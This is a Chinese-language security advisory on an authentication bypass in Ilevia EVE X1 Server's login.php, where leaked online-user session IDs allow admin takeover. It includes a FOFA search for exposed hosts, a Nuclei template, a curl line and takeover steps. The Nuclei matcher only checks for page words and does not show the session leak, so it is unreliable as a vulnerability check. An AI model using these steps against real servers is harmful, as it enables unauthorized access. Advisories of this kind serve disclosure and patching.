# Ilevia EVE X1 Server 身份认证绕过漏洞

## 漏洞信息

| 属性 | 值 |
|------|------|
| 漏洞名称 | Ilevia EVE X1 Server login.php 身份认证绕过 |
| 漏洞类型 | 身份认证绕过 |
| 严重程度 | 高危 |
| 影响组件 | login.php 接口 |
| 披露时间 | 2026-04-08 |

## 漏洞概述

Ilevia EVE X1 Server 的 login.php 接口存在身份认证绕过漏洞，未授权的攻击者可通过漏洞 url 获取在线用户 sessionid，导致用户信息泄露。攻击者切换网站 session 后可直接接管后台，造成信息泄露或恶意破坏。

## FOFA 查询

```ini
icon_hash="392278119"
```

## POC

### Nuclei

```yaml
id: ilevia-eve-x1-auth-bypass

info:
  name: Ilevia EVE X1 Server Authentication Bypass
  author: 实战安全研究
  severity: high
  description: Ilevia EVE X1 Server login.php authentication bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/login.php"
    matchers:
      - type: word
        words:
          - "EVE X1"
          - "login"
```

### Curl POC

```bash
# 获取在线用户 session
curl -v http://target/login.php
```

## 漏洞复现步骤

1. 访问目标站点 login.php 接口
2. 获取在线用户的 sessionid
3. 使用获取的 sessionid 构造请求
4. 成功登录后台

## 修复建议

1. 加强 session 管理机制
2. 限制未授权访问敏感接口
3. 强化身份验证逻辑

## 参考链接

- 原文链接：https://mp.weixin.qq.com/s/XXbG0AWawSWDyj70-qmG_w